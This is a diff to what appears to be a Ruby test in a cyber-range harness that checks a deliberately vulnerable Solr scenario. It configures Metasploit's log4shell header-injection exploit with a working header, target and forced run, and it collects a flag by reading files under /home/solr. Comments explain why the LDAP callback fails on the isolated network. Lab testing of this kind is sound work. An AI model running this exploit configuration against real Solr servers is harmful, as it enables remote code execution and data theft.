@@ -38,12 +38,33 @@ class Log4shellHeaderInjectionTest < PostProvisionTest
 
     # Tier 3 — exploit from the attacker VM; also captures the leaked flag
     # from /home/solr into the sentinel as evidence.
+    #
+    # KNOWN BLOCKER (needs a harness change): this module starts an LDAP server
+    # the target calls back to, so it needs SRVHOST set to the attacker's
+    # scenario-network IP. test_msf_exploit auto-sets FETCH_SRVHOST for fetch
+    # payloads but not SRVHOST; on the isolated VLAN the module's own
+    # srvhost_addr auto-resolution (SRVHOST 0.0.0.0 -> source_address) returns
+    # nil, so msf aborts with "Expected a string for the host parameter". The
+    # options below (HTTP_HEADER, TARGET 2, AutoCheck/ForceExploit) are all
+    # verified-accepted by msf; the exploit will land once the harness injects
+    # SRVHOST = attacker_ip (as it already does for FETCH_SRVHOST).
     test_msf_exploit('exploit/multi/http/log4shell_header_injection',
                      rport: 8983,
                      collect: 'cat /home/solr/*',
+                     force: true,
                      options: {
-                       'TARGETURI' => '/solr/admin/cores',
-                       'HEADER'    => 'X-Api-Version',
+                       # The AutoCheck scanner (log4shell_scanner) returns no
+                       # CheckCode and errors on srvhost resolution here; skip it
+                       # and exploit directly (force: true also overrides it).
+                       'AutoCheck' => false,
+                       'TARGETURI'   => '/solr/admin/cores',
+                       # The MSF module's option is HTTP_HEADER (not HEADER); Solr
+                       # logs X-Api-Version, so the JNDI string goes there.
+                       'HTTP_HEADER' => 'X-Api-Version',
+                       # TARGET 2 = Linux (Platform unix, ARCH_CMD). The default
+                       # Automatic (Java) target rejects the cmd/unix payload; the
+                       # Linux target runs it via the CommonsBeanutils1 gadget.
+                       'TARGET'      => 2,
                      },
                      tier: 3)
   end
